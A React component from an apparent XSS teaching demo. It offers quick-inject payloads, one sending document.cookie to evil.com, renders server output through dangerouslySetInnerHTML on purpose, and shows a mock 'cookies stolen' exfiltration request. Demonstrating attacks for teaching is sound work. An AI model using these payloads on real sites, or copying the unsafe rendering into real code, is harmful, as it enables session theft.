import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useProtection } from '../context/ProtectionContext';
import { apiFetch } from '../lib/api';

const XSS_PAYLOADS = [
  "<script>alert('hacked')</script>",
  "<img src=x onerror='stealCookies()'>",
  "<script>document.location='http://evil.com?c='+document.cookie</script>",
];

interface CommentResult {
  success?: boolean;
  blocked?: boolean;
  reason?: string;
  comment?: string;
  rendered?: string;
}

export default function XSSPanel() {
  const { protectionMode, addLogEntry } = useProtection();
  const [comment, setComment] = useState('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<CommentResult | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [renderedHtml, setRenderedHtml] = useState('');

  const submit = async () => {
    setLoading(true);
    setResult(null);
    const { data, status, latency } = await apiFetch(
      '/api/vulnerable/comment',
      { method: 'POST', body: JSON.stringify({ comment }) },
      protectionMode
    );
    const res = data as CommentResult;
    setResult(res);
    addLogEntry({
      timestamp: new Date().toLocaleTimeString(),
      method: 'POST',
      path: '/api/vulnerable/comment',
      status,
      badge: res.blocked ? 'BLOCKED' : 'PASSED',
      latency,
    });

    if (res.success && !res.blocked && res.rendered) {
      setRenderedHtml(res.rendered);
      // Trigger cookie-steal modal if XSS payload contains script/cookie theft
      if (comment.toLowerCase().includes('cookie') || comment.toLowerCase().includes('location') || comment.toLowerCase().includes('alert')) {
        setShowModal(true);
      }
    }
    setLoading(false);
  };

  const glowClass = protectionMode
    ? 'shadow-[0_0_20px_rgba(34,197,94,0.3)] border-l-4 border-green-500'
    : 'shadow-[0_0_20px_rgba(239,68,68,0.3)] border-l-4 border-red-500';

  return (
    <div className={`bg-gray-900 rounded-xl p-6 ${glowClass} flex flex-col gap-4`}>
      <div>
        <h2 className="text-xl font-bold text-white flex items-center gap-2">
          <span className="text-purple-400">👾</span> XSS — Script Injection
        </h2>
        <p className="text-gray-400 text-sm mt-1">
          Attacker injects malicious JavaScript into input fields that executes in victims' browsers.
        </p>
      </div>

      {/* Quick Inject */}
      <div className="flex flex-col gap-2">
        <span className="text-xs text-gray-500 uppercase tracking-wider">Quick Inject</span>
        {XSS_PAYLOADS.map((p) => (
          <button
            key={p}
            onClick={() => setComment(p)}
            className="text-left text-xs font-mono bg-purple-950/50 hover:bg-purple-900/50 border border-purple-800/50 text-purple-300 px-3 py-2 rounded transition-colors break-all"
          >
            {p}
          </button>
        ))}
      </div>

      {/* Comment Box */}
      <div className="flex flex-col gap-2">
        <textarea
          value={comment}
          onChange={(e) => setComment(e.target.value)}
          placeholder="Leave a comment..."
          rows={3}
          className="bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-white text-sm font-mono resize-none focus:outline-none focus:border-purple-500"
        />
        <button
          onClick={submit}
          disabled={loading || !comment.trim()}
          className="bg-purple-600 hover:bg-purple-700 disabled:opacity-50 text-white font-bold py-2 px-4 rounded-lg transition-colors"
        >
          {loading ? 'Submitting...' : 'Submit Comment'}
        </button>
      </div>

      {/* Result */}
      <AnimatePresence>
        {result && (
          <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            {result.blocked ? (
              <div className="bg-green-900/80 border border-green-500 rounded-lg p-4">
                <div className="text-lg font-bold text-green-400">🛡️ ATTACK BLOCKED</div>
                <div className="text-sm text-green-300 mt-1">{result.reason}</div>
              </div>
            ) : (
              <div className="bg-red-900/80 border border-red-500 rounded-lg p-4 flex flex-col gap-2">
                <div className="text-lg font-bold text-red-400">☠️ XSS EXECUTED</div>
                <div className="text-xs text-gray-400">Injected script rendered in DOM:</div>
                {/* dangerouslySetInnerHTML to demonstrate XSS — intentional for demo */}
                <div
                  className="bg-black/50 rounded p-2 font-mono text-xs text-green-300 break-all"
                  dangerouslySetInnerHTML={{ __html: renderedHtml }}
                />
              </div>
            )}
          </motion.div>
        )}
      </AnimatePresence>

      {/* Cookie Stolen Modal */}
      <AnimatePresence>
        {showModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/80"
            onClick={() => setShowModal(false)}
          >
            <motion.div
              initial={{ scale: 0.7, y: -50 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.7, opacity: 0 }}
              className="bg-red-950 border-2 border-red-500 rounded-2xl p-8 max-w-md mx-4 text-center"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="text-6xl mb-4">🍪</div>
              <div className="text-2xl font-bold text-red-400 mb-2">Your cookies have been stolen!</div>
              <div className="text-red-300 mb-2">Session hijacked.</div>
              <div className="text-sm text-gray-400 mb-6">
                In a real attack, an attacker's server would now receive your session token and take over your account.
              </div>
              <div className="bg-black/50 rounded p-3 font-mono text-xs text-green-300 mb-4 text-left break-all">
                POST http://evil.com/steal<br />
                cookie=sessionId%3Dabc123xyz_FAKE_TOKEN<br />
                victim_ip=192.168.x.x
              </div>
              <button
                onClick={() => setShowModal(false)}
                className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-6 rounded-lg"
              >
                Dismiss
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
